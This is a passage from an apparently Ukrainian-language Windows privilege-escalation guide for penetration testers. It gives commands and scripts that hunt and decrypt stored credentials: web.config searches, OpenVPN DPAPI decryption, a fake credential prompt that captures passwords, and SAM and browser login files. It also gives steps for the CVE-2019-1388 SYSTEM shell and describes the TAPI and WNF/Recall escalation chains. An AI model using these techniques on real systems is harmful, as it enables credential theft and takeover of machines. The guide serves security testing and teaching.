crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Конфігурація вебсервера IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у webroot IIS

Старий ZIP-бекап, розміщений безпосередньо у webroot, доступному через вебсервер, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP, перш ніж вважати це витоком. Шлях `C:\inetpub\wwwroot` за замовчуванням — лише один із можливих варіантів. Швидка локальна інвентаризація може перелічити назви та розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет або що знайдені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запит облікових даних

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що прямо **просити** клієнта надати **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які деякий час тому містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Варіант зі списком імен файлів без розширення Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Розглядайте файл із відповідною назвою як можливий зашифрований сховок; його наявність не означає, що ви можете прочитати його, розблокувати чи скористатися збереженими обліковими даними. Перевіряючи місця зберігання таких файлів, перегляньте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, також є лише ознакою можливого зашифрованого сховка. Для його розблокування потрібен справжній майстер-пароль і будь-який налаштований файл ключа чи чинники облікового запису. Якщо під час перевірки з належним дозволом у записі виявлено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте, чи існує зазначений обліковий запис, а також чи є хеш NT актуальним і чи приймає його служба NTLM цільової системи. Сам запис у сховку не надає прав Administrator або SYSTEM; також мають бути доступні віддалена служба, права облікового запису та окремий етап виконання через службу. В інвентаризації слід зазначати шлях до сховка та доступність для читання, а не виводити базу даних або збережені облікові дані.

Пошукайте всі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Варіант команди пошуку без розширення Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в кошику

Також перевірте кошик на наявність облікових даних

Перевірте доступні записи кошика на наявність видалених резервних копій і архівів конфігурації, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути давньою, а її назва — звичайною. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточного користувача прав на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваних резервних копій немає. Вважайте назву архіву приводом для перевірки, а не доказом того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може бути приводом перевірити можливість **підписання коду**. Якщо він містить доступний закритий ключ, цим ключем можна підписати змінений скрипт PowerShell; [PowerShell вимагає сертифікат для підписання коду із закритим ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють ідентифікатор підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання скрипта від імені іншого облікового запису поточний користувач має мати змогу змінити саме цей скрипт; чинне правило має приймати отриманий підпис для цього скрипта й цільового облікового запису; також потрібне заплановане завдання чи інший процес із вищими привілеями, який справді його запускає. Сама назва файлу `.pfx`, тема сертифіката чи можливість запису до скрипта не доводять, що цей ланцюжок умов виконано. Перш ніж відкривати матеріали із закритим ключем або запускати завдання, перевірте метадані, ACL, політику та команду запуску за розкладом.

Також перегляньте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки й отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися у форматі HTML або TXT, іноді в іменованому архіві резервної копії. Такі матеріали можуть надати доступ до окремого зашифрованого тому даних зі старішими резервними копіями; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для офлайнового відновлення облікових даних домену також потрібен відповідний кущ `SYSTEM`, як описано в [робочому процесі для резервних копій і привілейованих груп](../active-directory-methodology/privileged-groups-and-token-privileges.md). Самі лише назви файлів і заблокований том не доводять наявності придатного ключа відновлення чи резервної копії домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### У реєстрі

**Інші можливі розділи реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Вилучення ключів OpenSSH із реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome або Firefox**.\
Перевірте наявність баз даних, у яких зберігаються паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та обране браузерів — можливо, там зберігаються **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft документує розташування профілю за замовчуванням](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити це розташування. Наявність файлів лише вказує на можливе сховище облікових даних: перевірте, чи файли доступні для читання, чи є в користувача відповідний контекст DPAPI або інший дозволений ключовий матеріал, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не потребує відкриття бази даних або виведення розшифрованих паролів.

Для Firefox [Mozilla зазначає](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` — це відповідно файл ключів і файл із зашифрованими логінами профілю. Їх наявність лише вказує на потенційне джерело: перевірте, чи доступні для читання обидва файли, чи є збережені записи та чи захищає ключ Primary Password, перш ніж робити висновок про доступність облікових даних. Якщо знайдені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі лише артефакти браузера не підтверджують наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, ідентифікованих за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначаються в реєстрі відповідно в розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей реєстр створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього реєстру можна знайти дочірній розділ реєстру **InProcServer32**, який містить **значення за замовчуванням** із посиланням на **DLL** і значення **ThreadingModel**, яке може бути **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) або **Neutral** (модель без прив’язки до потоку).

![Історія браузерів — перезапис DLL COM: у CLSID цього реєстру можна знайти дочірній розділ реєстру InProcServer32, який містить значення за замовчуванням із посиланням на DLL і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-яку DLL**, яку буде виконано, ви зможете **підвищити привілеї**, якщо цю DLL виконає інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, перегляньте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Загальний пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу за певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **є плагіном msf**. Я створив цей плагін, щоб **автоматично запускати кожен POST-модуль metasploit, який шукає облікові дані** на машині жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для різних інструментів, які зберігають ці дані у відкритому вигляді (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але той успадковує всі відкриті дескриптори головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор привілейованого процесу**, створений за допомогою `OpenProcess()`, і **впровадити shellcode**.\
[Ознайомтеся з цим прикладом, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Ознайомтеся з [**цією іншою публікацією**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/), щоб отримати докладніше пояснення того, як тестувати та зловживати іншими відкритими дескрипторами процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом)].

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називають **каналами**, забезпечують міжпроцесну взаємодію та передавання даних.

Windows має функцію під назвою **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, навіть через різні мережі. Це схоже на архітектуру клієнт/сервер, де ролі визначено як **сервер named pipe** і **клієнт named pipe**.

Коли **клієнт** надсилає дані через канал, **сервер**, який налаштував канал, може **перейняти ідентичність** **клієнта**, якщо має необхідні права **SeImpersonate**. Якщо виявити **привілейований процес**, який взаємодіє через канал, що його можна імітувати, з’являється можливість **отримати вищі привілеї**, перейнявши ідентичність цього процесу після його взаємодії зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений інструмент дає змогу **перехоплювати обмін даними через named pipe за допомогою інструмента на кшталт Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати всі канали, щоб знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у серверному режимі відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати шляхом асинхронних подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як службу. Повний ланцюжок:

- Виконайте `ClientAttach`, задавши для `pszDomainUser` наявний шлях, доступний для запису → служба відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для запису асинхронних подій.
- Кожна подія записує контрольований зловмисником `InitContext` із `Initialize` у цей дескриптор. Зареєструйте line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викличте `TRequestMakeCall` (`Req_Func 121`), отримайте дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасуйте реєстрацію та завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, підключіться знову, а потім викличте `GetUIDllName` з довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через засоби перегляду Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні обробники URI (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) і виконувати файли, контрольовані зловмисником, від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Отримавши shell від імені користувача, ви можете виявити заплановані завдання чи інші процеси, які запускаються й **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів, порівнює поточний стан із попереднім і виводить усі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / обхід UAC

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи обліковий запис користувача без привілеїв.

Це дає змогу одночасно підвищити привілеї та обійти UAC за допомогою тієї самої вразливості. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час процесу, підписаний і виданий Microsoft.

Деякі із систем, на які це впливає:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб використати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Ви маєте всі необхідні файли та інформацію в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від середнього рівня цілісності адміністратора до високого / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та способи його обходу:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction для каталогу завантажень у корені вебсервера

Програма може створити передбачуваний підкаталог для завантажень, записати в нього файл із заданим користувачем ім’ям, а потім обробити цей файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його junction NTFS до запису з боку сервера, запис може перейти через junction до каталогу, доступного через вебсервер. Розміщений там скрипт може виконуватися з ідентифікатором вебслужби, якщо сервер виконує файли цього типу. Це специфічна для програми межа довільного запису; сам факт доступності каталогу завантажень для запису або наявності junction не доводить її існування.

Перевірте точну побудову шляху й час виконання обробника завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить механізм запису за точками повторного аналізу, а також чи виконує вебсервер файли в цільовому каталозі. Окремо встановіть ідентичності процесів механізму запису та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані точок повторного аналізу, але не може встановити поведінку обробника або майбутню підміну junction. Якщо виконання відбувається в обліковому записі служби, перш ніж розглядати окремий шлях через привілеї токена, перевірте **фактичний токен процесу**.

## Очищення запланованого завдання з привілеями, запущене через WNF

Заплановане завдання, для якого заборонено ручний запуск, усе одно може мати тригер, доступний користувачеві без привілеїв. Під час аудиту завдання з привілеями експортуйте його XML і перевірте **всі** тригери, а також DACL завдання, принципала й дію. Зокрема, `WnfStateChangeTrigger` визначає стан Windows Notification Facility (WNF); якщо поточний користувач має право публікувати оновлення для цього стану, він може опосередковано запустити завдання з налаштованою для нього ідентичністю, попри `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Наприклад, завдання Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` виконувалося від імені SYSTEM, приймало від звичайного користувача оновлення стану WNF `7508BCA32C079E41`, а потім перевіряло `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, навіть коли Recall було вимкнено.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Щоб перевірити доступність, отримайте адресу `ZwUpdateWnfStateData` з `ntdll.dll`, надішліть порожнє оновлення для восьмибайтового імені стану та зіставте статус повернення з даними про останній запуск завдання або активністю Procmon. У наведеному нижче скороченому пробнику використано послідовність байтів із прикладу завдання Recall; замініть її байтами, експортованими для завдання, яке перевіряється.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Перетворення рекурсивного очищення на привілейоване видалення

Корисний примітив — це не лише тригер, а привілейована процедура очищення, яка приймає контрольований зловмисником каталог. Простежте операцію від переліку до остаточної зміни: виявлення профілів/сеансів, вибір дочірніх елементів за wildcard-шаблоном, `SHCreateItemFromParsingName` і `IFileOperation::DeleteItem` — це чіткі ознаки того, що раніше перевірений шлях згодом рекурсивно обходитиметься. Якщо дочірні елементи не відкриваються відносно дескрипторів довірених каталогів і не перевіряються перед видаленням, зловмисник може змінити спосіб розв’язання шляху між переліком і використанням.<sup>[[43]](#references)</sup>

Поєднайте тригер WNF із заміною через [oplock, junction і символічне посилання Object Manager](#from-folder-contents-delete-to-system-eop), описаною нижче: oplock призупиняє очищення після вибору легітимного дочірнього елемента, а тим часом доступний для запису батьківський каталог підмінюється, щоб після відновлення привілейоване видалення розв’язало шлях через `\RPC Control` до захищеної цілі. У ланцюжку Recall це дало змогу видалити від імені SYSTEM `C:\Config.Msi`, що було необхідно для задокументованої техніки відкату MSI.<sup>[[31]](#references)[[43]](#references)</sup>

### Вкладені дочірні елементи обходять поверхневі виправлення reparse point

Перевірка лише контрольованого зловмисником кореневого каталогу та його безпосереднього дочірнього елемента не захищає від рекурсивного видалення на основі шляху. Залиште ці перевірені об’єкти легітимними, а підміну через junction/oplock перемістіть у ще один дочірній каталог нижче за ієрархією; зрештою `IFileOperation::DeleteItem` дійде до неперевіреного дочірнього елемента й перейде за його новою ціллю. CVE-2026-20941 виникла саме через таке неповне виправлення: перший патч для Recall перевірив `UKP` і каталог із назвою у форматі GUID, але залишив стару операцію рекурсивного видалення.<sup>[[43]](#references)</sup>

Безпечний підхід — відкрити **кожен дочірній елемент** відносно вже довіреного дескриптора каталогу, отримати й перевірити остаточний шлях/об’єкт, а потім застосувати до цього перевіреного дескриптора ознаку видалення. Не перевіряйте префікс, а потім не повертайтеся до рекурсивного видалення на основі шляху. Під час аналізу патчів також перевіряйте структури в реальному місці виклику: у цьому випадку аналіз під час виконання `OBJECT_ATTRIBUTES` у `NtCreateFile` показав ненульовий `RootDirectory` і відносне ім’я `{GUID}\\secure_file.lock`, спростувавши оманливий результат декомпілятора, який натякав на другий примітив `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Від довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка описана [**в цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а exploit-код [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Суть атаки — використати функцію відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмиснику потрібно створити **шкідливий інсталятор MSI**, який використовується для захоплення каталогу `C:\Config.Msi`. Пізніше Windows Installer використовуватиме його для зберігання файлів відкату під час видалення інших пакетів MSI; ці файли відкату буде змінено так, щоб вони містили шкідливе корисне навантаження.

### Ін’єкція шляху очищення через COM у Windows Installer (CVE-2025-27727)

